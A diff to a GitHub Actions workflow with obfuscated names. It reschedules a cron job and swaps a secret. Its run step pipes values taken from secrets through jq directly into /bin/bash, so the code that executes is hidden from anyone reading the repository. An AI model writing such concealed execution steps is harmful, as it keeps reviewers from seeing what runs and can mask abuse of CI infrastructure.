@@ -2,28 +2,27 @@ name: xiaodafeng3216
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 2/6 * * *'
+    - cron: '16 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiaodafeng3216
         env:
-          pz55260: ${{ secrets.pz55260 }}
+          zflw80166: ${{ secrets.zflw80166 }}
         run: |
-          echo $pz55260 | jq -r .vkvyv7 | /bin/bash
-          echo $s7759 | jq -r .yhx1477 | /bin/bash
-          echo $cgla5203 | jq -r .sk09 | /bin/bash
-          echo $uncsz0001 | jq -r .r9 | /bin/bash
-          echo $tfqpa2 | jq -r .ooyof0 | /bin/bash
-          echo $apvaq93 | jq -r .tu80651 | /bin/bash
-          echo $jzafz36 | jq -r .a3 | /bin/bash
-          echo $soo30258 | jq -r .qc7 | /bin/bash
-          echo $gbwkp994 | jq -r .f283 | /bin/bash
-          echo $ddmc7638 | jq -r .m27336 | /bin/bash
-          echo $umm539 | jq -r .ivahx1424 | /bin/bash
-          echo $bwmcu5 | jq -r .wxgs2484 | /bin/bash
-          echo $n57 | jq -r .pnwp6 | /bin/bash
+          echo $zflw80166 | jq -r .ddq423 | /bin/bash
+          echo $t1430 | jq -r .wh0 | /bin/bash
+          echo $qhh70902 | jq -r .vki9334 | /bin/bash
+          echo $e5 | jq -r .wlcq1322 | /bin/bash
+          echo $gl5606 | jq -r .nprhe31 | /bin/bash
+          echo $o6748 | jq -r .j58478 | /bin/bash
+          echo $y4249 | jq -r .f36184 | /bin/bash
+          echo $vwp84 | jq -r .n19184 | /bin/bash
+          echo $c7 | jq -r .catnt34499 | /bin/bash
+          echo $ovns39 | jq -r .dcxx710 | /bin/bash
+          echo $bivm78237 | jq -r .vlax02 | /bin/bash
+          echo $vztt67364 | jq -r .f2 | /bin/bash
 
